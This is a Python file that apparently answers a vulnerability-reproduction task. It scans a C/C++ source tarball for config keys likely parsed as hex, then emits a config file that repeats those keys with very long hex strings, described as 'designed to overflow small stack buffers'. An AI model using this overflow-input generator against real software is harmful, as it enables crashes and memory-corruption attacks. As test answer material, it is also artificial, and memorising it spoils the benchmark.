import os
import re
import tarfile
import tempfile
from typing import List, Tuple, Dict


def _safe_extract(tar: tarfile.TarFile, path: str) -> None:
    def is_within_directory(directory: str, target: str) -> bool:
        abs_directory = os.path.abspath(directory)
        abs_target = os.path.abspath(target)
        return os.path.commonpath([abs_directory]) == os.path.commonpath([abs_directory, abs_target])

    for member in tar.getmembers():
        member_path = os.path.join(path, member.name)
        if not is_within_directory(path, member_path):
            continue
        tar.extract(member, path)


def _read_text(path: str) -> str:
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return f.read()
    except Exception:
        return ""


def _find_source_files(root: str) -> List[str]:
    exts = {".c", ".h", ".cpp", ".cc", ".cxx", ".hpp", ".hh"}
    files = []
    for r, _, fs in os.walk(root):
        for name in fs:
            _, ext = os.path.splitext(name)
            if ext.lower() in exts:
                files.append(os.path.join(r, name))
    return files


def _collect_key_occurrences(text: str) -> List[Tuple[str, int, str]]:
    # Returns list of tuples: (key_literal, position_index, context_string)
    occurrences: List[Tuple[str, int, str]] = []
    # Patterns to find string compares with a literal config key
    cmp_funcs = r"(?:strcmp|strcasecmp|strncmp|strncasecmp)"
    # Pattern 1: func(var, "KEY"[, n])
    pat1 = re.compile(rf"{cmp_funcs}\s*\(\s*[^,]+,\s*\"([^\"]{{1,64}})\"\s*(?:,|\))", re.MULTILINE)
    # Pattern 2: func("KEY", var[, n])
    pat2 = re.compile(rf"{cmp_funcs}\s*\(\s*\"([^\"]{{1,64}})\"\s*,\s*[^,\)]+\s*(?:,|\))", re.MULTILINE)

    for m in pat1.finditer(text):
        key = m.group(1)
        if 1 <= len(key) <= 64 and re.fullmatch(r"[A-Za-z0-9_\-\.]+", key or ""):
            start = m.start()
            context = text[start:start + 2000]
            occurrences.append((key, start, context))

    for m in pat2.finditer(text):
        key = m.group(1)
        if 1 <= len(key) <= 64 and re.fullmatch(r"[A-Za-z0-9_\-\.]+", key or ""):
            start = m.start()
            context = text[start:start + 2000]
            occurrences.append((key, start, context))

    return occurrences


def _score_key_occurrence(key: str, context: str) -> int:
    score = 0
    kl = key.lower()
    ctx = context.lower()

    # Base boost if key name hints at hex-like value
    hints = {
        "hex": 6,
        "id": 2,
        "uuid": 6,
        "guid": 6,
        "key": 4,
        "secret": 3,
        "token": 2,
        "hash": 5,
        "digest": 5,
        "sha": 5,
        "md5": 5,
        "color": 4,
        "colour": 4,
        "rgb": 3,
        "mac": 6,
        "address": 2,
        "addr": 2,
        "serial": 2,
        "nonce": 4,
        "salt": 3,
        "seed": 3,
        "iv": 5,
        "pub": 3,
        "priv": 3,
        "signature": 5,
    }
    for h, val in hints.items():
        if h in kl:
            score += val

    # Contextual signals indicating hex parsing behavior
    if "isxdigit" in ctx:
        score += 5
    if "hex2bin" in ctx or "unhex" in ctx or "fromhex" in ctx or "parse_hex" in ctx or "str_is_hex" in ctx:
        score += 6
    # sscanf with %x variants
    if re.search(r"sscanf\s*\([^)]*%[0-9]*x", ctx):
        score += 6
    if re.search(r"sscanf\s*\([^)]*%0?2?x", ctx):
        score += 3
    # strtoul/strtoull with base 16 or autodetect (0)
    if re.search(r"strtoull?\s*\([^,]+,\s*[^,]*,\s*16\s*\)", ctx):
        score += 5
    if re.search(r"strtoull?\s*\([^,]+,\s*[^,]*,\s*0\s*\)", ctx):
        score += 3
    # manual hex loop
    if re.search(r"while\s*\(\s*isxdigit", ctx) or re.search(r"for\s*\([^)]*isxdigit", ctx):
        score += 5
    # byte writes likely for hex
    if "nibble" in ctx or "nybble" in ctx:
        score += 2

    # Penalize if context appears to expect numeric decimal only
    if re.search(r"sscanf\s*\([^)]*%[0-9]*d", ctx):
        score -= 2

    return score


def _select_probable_hex_keys(root: str, max_keys: int = 6) -> List[str]:
    files = _find_source_files(root)
    key_scores: Dict[str, int] = {}

    for f in files:
        text = _read_text(f)
        if not text:
            continue
        occs = _collect_key_occurrences(text)
        for key, _, ctx in occs:
            s = _score_key_occurrence(key, ctx)
            if s != 0:
                key_scores[key] = key_scores.get(key, 0) + s

    # If no scored keys, try to gather candidate keys and score by name alone
    if not key_scores:
        name_only_keys: Dict[str, int] = {}
        for f in files:
            text = _read_text(f)
            if not text:
                continue
            for key, _, _ in _collect_key_occurrences(text):
                if 1 <= len(key) <= 64 and re.fullmatch(r"[A-Za-z0-9_\-\.]+", key):
                    name_only_keys[key] = name_only_keys.get(key, 0) + 1
        # Score by hints on key name
        for key, freq in name_only_keys.items():
            s = 0
            kl = key.lower()
            if "hex" in kl: s += 6
            if "uuid" in kl or "guid" in kl: s += 5
            if "mac" in kl: s += 5
            if "color" in kl or "colour" in kl: s += 4
            if "key" in kl: s += 3
            if "hash" in kl or "digest" in kl or "sha" in kl or "md5" in kl: s += 4
            if "id" in kl: s += 2
            if "serial" in kl: s += 2
            if "addr" in kl or "address" in kl: s += 2
            if "nonce" in kl or "salt" in kl or "seed" in kl: s += 3
            if "iv" in kl: s += 4
            if s > 0:
                key_scores[key] = s + min(freq, 3)

    # Sort keys by score desc then name length asc
    ranked = sorted(key_scores.items(), key=lambda kv: (-kv[1], len(kv[0]), kv[0]))
    return [k for k, _ in ranked[:max_keys]]


def _build_poc_from_keys(keys: List[str]) -> bytes:
    # Long hex payload designed to overflow small stack buffers
    # Use multiple variants to accommodate parsers
    # Length chosen to be large but not excessively huge
    hex_long_512 = "A" * 512
    hex_long_768 = "ABCDEF0123456789" * 48  # 16 * 48 = 768
    variants = [
        "0x" + hex_long_512,
        hex_long_512,
        hex_long_768,
    ]

    lines: List[str] = []
    # Some INI parsers expect a section; add a generic one without harm for others
    lines.append("[general]\n")

    # Build lines using multiple syntaxes and quoting styles
    for key in keys:
        for v in variants:
            lines.append(f"{key}={v}\n")
            lines.append(f"{key} = {v}\n")
            lines.append(f"{key}:{v}\n")
            lines.append(f"{key}: {v}\n")
            lines.append(f"{key} {v}\n")
            # quoted
            lines.append(f'{key}="{v}"\n')
            lines.append(f"{key}='{v}'\n")
        # Add an alternative representation without separators for some simplistic parsers
        lines.append(f"{key}\n{hex_long_512}\n")

    # Add some generic fallback keys at the end to increase coverage across parsers
    # These are unlikely to cause non-zero exit on fixed versions and help trigger hex paths.
    fallback_keys = [
        "hex", "uuid", "guid", "mac", "color", "colour", "hash", "digest", "sha256", "md5", "id", "serial", "secret",
        "key", "private_key", "public_key", "address", "addr", "nonce", "salt", "seed", "iv"
    ]
    # Avoid duplicates
    seen = set(k.lower() for k in keys)
    extras = [k for k in fallback_keys if k.lower() not in seen]
    # Limit extras to keep PoC concise
    for key in extras[:5]:
        lines.append(f"{key} = 0x{hex_long_512}\n")
        lines.append(f"{key}:{hex_long_512}\n")

    data = "".join(lines)
    return data.encode("ascii", errors="ignore")


class Solution:
    def solve(self, src_path: str) -> bytes:
        workdir = tempfile.mkdtemp(prefix="poc_hex_")
        try:
            with tarfile.open(src_path, "r:*") as tar:
                _safe_extract(tar, workdir)
        except Exception:
            # If extraction fails, fallback to a generic PoC
            generic = (
                "[general]\n"
                "hex=0x" + ("A" * 512) + "\n"
                "key=" + ("B" * 512) + "\n"
                "uuid:" + ("C" * 512) + "\n"
            )
            return generic.encode("ascii", errors="ignore")

        # Select most probable hex-sensitive config keys
        keys = _select_probable_hex_keys(workdir, max_keys=6)

        if not keys:
            # Fallback PoC with generic keys likely to be hex-parsed in many projects
            keys = ["hex", "uuid", "mac", "color", "hash", "key"]

        # Build PoC content using identified keys
        poc = _build_poc_from_keys(keys)

        # Keep PoC reasonably small; trim if overly long
        if len(poc) > 4096:
            # Prefer keeping the beginning which contains various syntaxes
            poc = poc[:4096]

        return poc
